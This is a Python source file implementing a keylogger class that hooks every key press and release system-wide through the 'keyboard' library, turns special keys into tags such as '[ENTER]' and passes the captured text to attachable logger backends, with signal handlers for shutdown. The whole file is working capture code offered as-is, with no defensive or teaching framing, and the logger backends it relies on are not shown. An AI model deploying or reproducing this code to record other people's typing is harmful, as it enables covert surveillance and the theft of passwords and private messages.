import time
import signal

import keyboard

import logger


class KeyloggerInterruptException(Exception):
    pass


class Keylogger:
    def __init__(self):
        self.__loggers = []

        # log each key pressed
        keyboard.hook(callback=self._on_event)

        # safely shut down the keylogger
        signal.signal(signal.SIGINT, self.shutdown)
        signal.signal(signal.SIGTERM, self.shutdown)
        signal.signal(signal.SIGHUP, self.shutdown)
        
    def attach_logger(self, logger: logger.AbstractLogger):
        self.__loggers.append(logger)
        logger.on_attached()
        return self

    def detach_logger(self, logger: logger.AbstractLogger):
        self.__loggers.remove(logger)
        logger.close()
        return self

    def wait(self):
        try:
            while True:
                time.sleep(1e6)
        except KeyloggerInterruptException:
            pass

    def shutdown(self, *_):
        while len(self.__loggers) > 0:
            logger = self.__loggers.pop()
            logger.close()
        raise KeyloggerInterruptException()

    def _on_event(self, event: keyboard.KeyboardEvent):
        if event.event_type == 'down':
            self._on_keypress(event)
        else:
            self._on_keyrelease(event)

    def _on_keypress(self, event: keyboard.KeyboardEvent):
        name = event.name
        
        # regular character
        if len(name) == 1:
            self.log_key(name)
            return

        # not a character, special key (e.g ctrl, alt, etc.)
        if name == 'space':
            # ' ' instead of 'space'
            self.log_key(' ')
        elif name == 'enter':
            # add a new line whenever an ENTER is pressed
            self.log_key('[ENTER]\n')
        elif name == 'decimal':
            self.log_key('.')
        else:
            # replace spaces with underscores
            self.log_key('[{}]'.format(name.replace(' ', '_').upper()))

    def _on_keyrelease(self, event: keyboard.KeyboardEvent):
        name = event.name

        # skip regular letters
        if len(name) == 1:
            return
        if name in ['space', 'enter']:
            return

        self.log_key('[{}-RELEASE]'.format(name.replace(' ', '_').upper()))

    def log_key(self, text: str):
        for logger in self.__loggers:
            logger.log(text)

    def log_object(self, o):
        for logger in self.__loggers:
            logger.log('\n----- Object start -----\n')
            logger.log(str(o))
            logger.log('\n----- Object end -----\n')
    